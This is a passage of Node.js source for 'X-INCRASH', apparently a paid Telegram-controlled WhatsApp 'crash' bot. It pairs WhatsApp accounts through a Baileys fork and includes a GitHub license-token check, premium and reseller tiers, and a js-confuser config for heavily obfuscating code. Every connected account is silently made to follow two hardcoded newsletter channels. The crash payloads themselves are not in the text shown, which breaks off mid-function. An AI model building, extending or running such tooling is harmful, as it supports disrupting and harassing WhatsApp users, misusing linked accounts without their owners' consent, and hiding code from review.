const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    GroupSettingChange,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@otaxayun/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const dotenv = require("dotenv");
const FormData = require("form-data");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "./cooldown.json";
const axios = require("axios");
const chalk = require("chalk");
const { exec } = require("child_process");
const moment = require('moment');
const database = require("./database/premium.json");
const ONLY_FILE = "./lib/only.json";
const { tiktokDl } = require('./lib/tiktok');
const config = require("./settings/config.js");
const settings = require("./settings/config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const OWNER_ID = config.OWNER_ID;
const domain = config.domain;
const pltc = config.pltc;
const plta = config.plta;
const groupSettingsPath = './lib/group-settings.json';
const RESELLER_FILE = "./database/resellers.json";
const ADP_FILE = "./database/adminpanel.json";
const ADMIN_FILE = "./database/admin.json";
const PREM_FILE = "./database/premium.json";
/*
const GITHUB_OWNER = "Danzstrr";
const GITHUB_REPO_KILL = "killtoken";
const GITHUB_TOKENS_FILE = "kills.json";
const GITHUB_TOKEN2 = "";

async function checkKillSwitch() {
  try {
    const res = await axios.get(
      `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO_KILL}/contents/kills.json`,
      {
        headers: {
          Authorization: `token ${GITHUB_TOKEN2}`,
          Accept: "application/vnd.github.v3.raw",
        },
      }
    );

    const killData = typeof res.data === "string" ? JSON.parse(res.data) : res.data;

    if (killData.status === "on") {
      const reasonMsg = killData.reason ? `${killData.reason}\n` : '';
      const pesanMsg = killData.message ? `${killData.message}\n` : '';
      const text = `Script telah dimatikan oleh @Danzriel\n${pesanMsg}`;

      console.log(text);

      if (typeof bot !== "undefined") {
        try {
          await bot.sendMessage(`${OWNER_ID}`, text, { parse_mode: 'Markdown' });
        } catch (e) {
          console.log('Gagal mengirim pesan ke Telegram:', e+"");
        }
      }

      process.exit(1);
    }
  } catch (err) {
    console.warn("⚠️ Gagal cek kill switch:", err.message);
  }
}
setInterval(checkKillSwitch, 800000);
checkKillSwitch();
*/
// ~ Thumbnail Vid




// ~ Database Url
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/Danzstrr/xincrash/refs/heads/main/tokens.json"; // Ganti dengan URL GitHub yang benar

// ----------------- ( Pengecekan Token ) ------------------- \\
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);

    // Pastikan struktur datanya sesuai { "tokens": ["xxxx", "yyyy"] }
    if (!response.data || !Array.isArray(response.data.tokens)) {
      console.error(chalk.red("❌ Struktur file tokens.json tidak valid."));
      return [];
    }

    console.log(chalk.green(`✅ Daftar token berhasil diambil dari GitHub (${response.data.tokens.length} terdaftar)`));
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue(`🔍 Memeriksa apakah token valid\n`));

  // Cek token environment
  if (!BOT_TOKEN) {
    console.error(chalk.red("❌ BOT_TOKEN tidak ditemukan! Pastikan sudah diset di .env"));
    process.exit(1);
  }

  // Ambil daftar token dari GitHub
  const validTokens = await fetchValidTokens(BOT_TOKEN);

  // Pastikan hasilnya berupa array
  if (!Array.isArray(validTokens)) {
    console.error(chalk.red("❌ Gagal memuat daftar token dari GitHub (data bukan array)"));
    process.exit(1);
  }

  // Validasi token
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red(`
═══════════════════════════════════════════
TOKEN ANDA TIDAK TERDAFTAR DI DATABASE !!!
═══════════════════════════════════════════
⠀⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿tolol mmk⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠹⢿⣿⣿⡿⠃buy maknya⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
⢀⣼⣿⣷⣾⡽⡄⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣿⣿⣿⡿⢿⣟⣽⣾⣿⣿⣦⠀⠀
⣸⣿⣿⣾⣿⣿⣮⣤⣤⣤⣤⡀⠀⠀⠻⣿⡯⠽⠿⠛⠛⠉⠉⢿⣿⣿⣿⣿⣷⡀
⣿⣿⢻⣿⣿⣿⣛⡿⠿⠟⠛⠁⣀⣠⣤⣤⣶⣶⣶⣶⣷⣶⠀⠀⠻⣿⣿⣿⣿⣇
⢻⣿⡆⢿⣿⣿⣿⣿⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠀⣠⣶⣿⣿⣿⣿⡟
⠈⠛⠃⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⠟⠋⠁⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));
    process.exit(1);
  }

  console.log(chalk.green(`✅ あなたのトークンは有効です`));
  startBot();
  initializeWhatsAppConnections();
}

function startBot() {
  console.log(chalk.blue(`
⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣧⠀⠀⣠⣴⣶⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣴⣶⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣆⠀⢀⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣄⣀⣠⣤⣤⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣷⣶⣶⣤⣤⣤⣤⣀⣀⣀⣀⣀⣰⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⣹⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤⣴⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡆⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⣿⣿⣿⣟⣁⠀⣿⡀⣀⣤⣾⣿⣿⣿⡟⣿⣿⣿⣿⣿⣿⣿⣭⣤⡴⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⢸⡇⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣈⣹⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠛⠋⢹⡇⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢙⣿⣿⣿⣿⣿⣿⡄⠙⠻⣿⠿⠿⠿⢿⡿⠛⠛⠛⠉⠉⠁⢸⣿⠀⠀⠀⠀⢸⡇⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⣿⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⢸⡇⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⣿⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⣸⡇⠀⠀⠀⠀⠀⠀⢸⣿⣀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⠛⢿⣿⡿⣿⣿⣿⠀⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣿⣿⠋⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠻⠁⠹⠁⠛⠀⠀⠀
⠀⠀⠀⠘⠉⢿⠇⠙⠇⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣻⣿⣿⣿⣿⣿⣿⣿⠟⠉⠀⠀⠀⠀⠈⠻⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⠿⠿⠿⠿⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠛⠛⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ developer: t.me/Danzriel
☇ Name Script : X-INCRASH
☇ Version : 5.0.0

`));
console.log(chalk.white(``));
}
validateToken();


const bot = new TelegramBot(BOT_TOKEN, { polling: true });
/*
function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./database/premium.json');
ensureFileExists('./database/admin.json');
*/

function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}


const USER_IDS_FILE = 'database/userids.json';

function readUserIds() {
    try {
        const data = fs.readFileSync(USER_IDS_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error('Gagal membaca daftar ID pengguna:', error);
        return [];
    }
}


function saveUserIds(userIds) {
    try {
        fs.writeFileSync(USER_IDS_FILE, JSON.stringify(Array.from(userIds)), 'utf8');
    } catch (error) {
        console.error('Gagal menyimpan daftar ID pengguna:', error);
    }
}

const userIds = new Set(readUserIds());

function addUser(userId) {
    if (!userIds.has(userId)) {
        userIds.add(userId);
        saveUserIds(userIds);
        console.log(`Pengguna ${userId} ditambahkan.`);
    }
}

let xincrash;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        xincrash = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          xincrash.ev.on("Connection.update", async (update) => {
            const { Connection, lastDisConnect } = update;
            if (Connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, xincrash);
              resolve();
            } else if (Connection === "close") {
              const shouldReConnect =
                lastDisConnect?.error?.output?.statusCode !==
                DisConnectReason.loggedOut;
              if (shouldReConnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          xincrash.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp Connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function ConnectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote>𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 ⚚</blockquote>
— Number : ${botNumber}.
— Status : Process
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  xincrash = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  xincrash.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote>X-INCRASH ⚚</blockquote>
— Number : ${botNumber}.
— Status : Not Connected
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await ConnectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote>𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 ⚚</blockquote>
— Number : ${botNumber}.
— Status : Gagal ❌
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      xincrash.newsletterFollow("120363406468678080@newsletter");
      xincrash.newsletterFollow("120363402421940993@newsletter");
      sessions.set(botNumber, xincrash);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<blockquote>𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 ⚚</blockquote>
— Number : ${botNumber}.
— Status : Connected
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  let customcode = "DANZ1234"
  const code = await xincrash.requestPairingCode(botNumber, customcode);
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
<blockquote>𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 ⚚</blockquote>
— Number : ${botNumber}.
— Code Pairing : ${formattedCode}
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote>𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛</blockquote>
— Number : ${botNumber}.
─ Status : Error ❌ ${error.message}
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  xincrash.ev.on("creds.update", saveCreds);

  return xincrash;
}

// ~ Fungsional Function Before Parameters
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~ Get Speed Bots
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}

// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setcd 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

 
function saveAdmins(adminData) {
  fs.writeFileSync(ADMIN_FILE, JSON.stringify(adminData, null, 2));
}

function saveResellers(resellerData) {
  fs.writeFileSync(RESELLER_FILE, JSON.stringify(resellerData, null, 2));
}

function saveAdp(adpData) {
  fs.writeFileSync(ADP_FILE, JSON.stringify(adpData, null, 2));
}

function savePremium(premiumData) {
  fs.writeFileSync(PREM_FILE, JSON.stringify(premiumData, null, 2));
}
 
function loadAdmins() {
  if (!fs.existsSync(ADMIN_FILE)) return { admins: [] };
  return JSON.parse(fs.readFileSync(ADMIN_FILE));
}

function loadResellers() {
  if (!fs.existsSync(RESELLER_FILE)) return { resellers: [] };
  return JSON.parse(fs.readFileSync(RESELLER_FILE));
}

function loadAdp() {
  if (!fs.existsSync(ADP_FILE)) return { adminpanels: [] };
  return JSON.parse(fs.readFileSync(ADP_FILE));
}

function loadPremium() {
  if (!fs.existsSync(PREM_FILE)) return { premiums: [] };
  return JSON.parse(fs.readFileSync(PREM_FILE));
}
 
function isAdmin(userId) {
  const { admins } = loadAdmins();
  return admins.includes(userId);
}
 
function isReseller(userId) {
  const { resellers } = loadResellers();
  return resellers.includes(userId);
}

function isAdp(userId) {
  const { adminpanels } = loadAdp();
  return adminpanels.includes(userId);
}

function isPremium(userId) {
  const { premiums } = loadPremium();
  return premiums.includes(userId);
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function saveActiveSessions(botNumber) {
  try {
    const set = new Set()
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf8"))
      for (const n of Array.isArray(existing) ? existing : []) if (n) set.add(String(n))
    }
    set.add(String(botNumber))
    const tmp = SESSIONS_FILE + ".tmp"
    fs.writeFileSync(tmp, JSON.stringify([...set]))
    fs.renameSync(tmp, SESSIONS_FILE)
  } catch {}
}

// ~ Enc
const getAphocalypsObfuscationConfig = () => {
  return {
    target: "node",
    calculator: true,
    compact: true,
    hexadecimalNumbers: true,
    controlFlowFlattening: 0.75,
    deadCode: 0.2,
    dispatcher: true,
    duplicateLiteralsRemoval: 0.75,
    flatten: true,
    globalConcealing: true,
    identifierGenerator: "zeroWidth",
    minify: true,
    movedDeclarations: true,
    objectExtraction: true,
    opaquePredicates: 0.75,
    renameVariables: true,
    renameGlobals: true,
    stringConcealing: true,
    stringCompression: true,
    stringEncoding: true,
    stringSplitting: 0.75,
    rgf: false,
  };
};

// #Progres #1
const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
};

// ~ Update Progress 
// Fix `updateProgress()`
async function updateProgress(bot, chatId, message, percentage, status) {
    if (!bot || !chatId || !message || !message.message_id) {
        console.error("updateProgress: Bot, chatId, atau message tidak valid");
        return;
    }

    const bar = createProgressBar(percentage);
    const levelText = percentage === 100 ? "🔥 Selesai" : `⚙️ ${status}`;
